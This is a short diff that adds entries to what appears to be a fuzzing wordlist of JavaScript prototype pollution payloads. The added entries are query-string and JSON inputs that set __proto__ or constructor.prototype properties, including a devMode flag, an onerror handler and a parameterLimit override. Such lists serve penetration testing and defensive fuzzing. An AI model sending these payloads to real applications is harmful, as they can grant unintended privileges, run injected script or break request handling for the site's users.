@@ -4,8 +4,11 @@ t&a[__proto__]=b&a[__proto__]&a[length]=100000000
 obj["__proto__"]
 obj.__proto__
 customer.__proto__.toString = ()=>{alert("polluted")}
+a[constructor][prototype]=image&a[constructor][prototype][onerror]=...
+__proto__.preventDefault.__proto__.handleObj
 !Body
 __proto_+AF8-
 {"__proto__": {"devMode": true}}
 a.constructor.prototype[1] = "yolo"
 Object.prototype.sayBye = function(){console.log("bye!")}
+{ "__proto__":{"parameterLimit":1}}
